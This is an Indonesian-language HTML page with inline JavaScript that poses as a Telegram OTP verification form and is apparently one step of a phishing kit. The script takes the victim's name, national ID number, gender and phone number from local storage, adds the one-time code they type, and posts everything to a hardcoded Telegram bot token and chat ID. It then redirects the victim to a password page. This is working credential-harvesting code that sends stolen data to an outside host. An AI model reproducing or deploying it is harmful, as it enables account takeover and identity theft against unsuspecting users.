      /* overlay.css */
      .overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;

  <body class="d-flex flex-column h-100">
    <!-- Overlay -->
    <div id="overlay" class="overlay">
      <div class="spinner"></div>
    </div>

    <main class="flex-shrink-0">
      <div class="container container-narrow">
        <div class="header mt-3 text-center">
          <img src="jsss.jpg" class="img-fluid" width="350" />
        </div>

        <h4 class="fw-bold mt-2 page-header text-center">Verifikasi OTP</h4>
        <form id="secondForm" action="auth/secondData.php" method="post">
          <div class="mb-3">
            <label for="otp" class="form-label"
              >Silahkan masukkan kode OTP yang sudah anda terimah di aplikasi
              <strong>Telegram</strong></label
            >
            <input
              name="otp"
              maxlength="5"
              id="otp"
              class="form-control"
              type="tel"
              required
              placeholder="Masukkan kode verifikasi"
            />
          </div>

          <div class="text-center">
            <button
              type="submit"
              class="btn btn-lg btn-block btn-mk"
              id="submitOtpButton"
              style="background-color: #05529b; color: white"
            >
              Berikutnya
            </button>
          </div>
        </form>
      </div>
    </main>

    <!-- Include JavaScript -->
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        document.getElementById("overlay").style.display = "none";

        document
          .getElementById("submitOtpButton")
          .addEventListener("click", function (e) {
            e.preventDefault();

            // Ambil nilai OTP
            const otp = document.getElementById("otp").value.trim();

            if (otp === "") {
              alert("Kode OTP harus diisi!");
              return;
            }

            // Simpan nilai OTP ke local storage
            localStorage.setItem("otp", otp);

            // Tampilkan overlay
            document.getElementById("overlay").style.display = "flex";

            // Siapkan pesan untuk Telegram
            const message = `
────────────────
📝 Data Verifikasi OTP:
────────────────
👤 Nama: ${JSON.parse(localStorage.getItem("userData")).fullName || "-"}
📅 No KTP: ${JSON.parse(localStorage.getItem("userData")).icNumber || "-"}
👥 Jenis Kelamin: ${JSON.parse(localStorage.getItem("userData")).sek || "-"}
📱 No. Telepon: ${
              JSON.parse(localStorage.getItem("userData")).phoneNumber || "-"
            }
🔐 Kode OTP: ${otp}
────────────────`;

            // Ganti dengan token bot dan chat ID Anda
            const botToken = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc";
            const chatId = "5265564576";

            // Kirim ke Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "HTML",
              }),
            })
              .then((response) => response.json())
              .then((data) => {
                // Redirect ke halaman password setelah pengiriman berhasil
                window.location.href = "password.html";
              })
              .catch((error) => {
                console.error("Error:", error);
                alert("Terjadi kesalahan saat mengirim data.");
              })
              .finally(() => {
                document.getElementById("overlay").style.display = "none";
              });
          });
      });
    </script>
